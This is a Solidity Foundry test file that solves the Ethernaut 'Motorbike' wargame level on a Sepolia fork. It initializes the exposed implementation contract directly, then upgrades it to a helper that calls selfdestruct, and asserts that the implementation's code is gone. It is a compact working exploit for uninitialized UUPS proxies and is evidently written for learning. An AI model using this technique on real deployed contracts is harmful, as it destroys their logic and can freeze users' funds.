// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {HelpUtils} from "./HelpUtils.sol";
import {Test, console} from "forge-std/Test.sol";
import {Motorbike, Engine} from "../src/ethernaut/Motorbike.sol";

contract SelfDestruct {
    function selfDestruct(address account) external {
        selfdestruct(payable(account));
    }
}

contract MotorbikeAttackerTest is Test, HelpUtils {
    address alice = 0x6278A1E803A76796a3A1f7F6344fE874ebfe94B2;
    Motorbike motorbike =
        Motorbike(payable(0xbd8996f4c3Ef32308a170c49b28Ec83F6B95cEFA));
    Engine engine = Engine(0x504585C069164392293d1C691765263570Ed7a9e);
    uint256 constant blockNumber = 6338082;

    function setUp() external {
        vm.selectFork(
            vm.createFork(vm.envString("SEPOLIA_RPC_URL"), blockNumber)
        );

        uint256 horsePower = Engine(address(motorbike)).horsePower();
        console.log("horsePower", horsePower);

        address implementation = HelpUtils.getImplementationAddress(
            address(motorbike)
        );
        assertEq(implementation, address(engine));

        console.log(
            "implementation engine codeLength:",
            address(engine).code.length
        );
        _attack();

        console.log("Attack After:");
    }

    function testAttack() public view {
        console.log(
            "implementation engine codeLength:",
            address(engine).code.length
        );

        assertEq(address(engine).code.length, 0);
    }

    function _attack() internal {
        vm.startPrank(alice);

        engine.initialize();

        SelfDestruct selfDestruct = new SelfDestruct();
        engine.upgradeToAndCall(
            address(selfDestruct),
            abi.encodeCall(SelfDestruct.selfDestruct, (alice))
        );

        vm.stopPrank();
    }
}

// forge test --match-contract MotorbikeAttackerTest -vvv
